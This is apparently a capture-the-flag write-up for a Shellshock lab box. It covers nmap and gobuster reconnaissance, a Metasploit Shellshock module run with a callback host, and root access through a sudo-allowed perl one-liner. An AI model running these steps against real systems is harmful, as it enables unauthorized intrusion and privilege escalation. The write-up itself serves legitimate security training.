nmap scan:

```
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
```

Use gobuster to bruteforce web directory

```
gobuster dir -u http://10.10.10.56/ -w ./small.txt
```

gobuster find a path that returns 403, this might indicate that we can exploit the Apache cgi shellshock bug

```
/cgi-bin/             (Status: 403) [Size: 294]
```

Search for script file under the directory

```
gobuster dir -u http://10.10.10.56/cgi-bin/ -w ./small.txt -x sh
```

We find a file named `user.sh`

```
/user.sh              (Status: 200) [Size: 118]
```

Use `exploit/multi/http/apache_mod_cgi_bash_env_exec`

```
set rhost 10.10.10.56
set lhost 10.10.14.4
set TARGETURI /cgi-bin/user.sh
```

We can get the user flag, but for root flag we need privilege escalation.

Run `sudo -l`, we can run perl as root

```
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
```

 `echo 'system("cat /root/root.txt");' > get-flag.pl`

Then run `sudo perl get-flag.pl`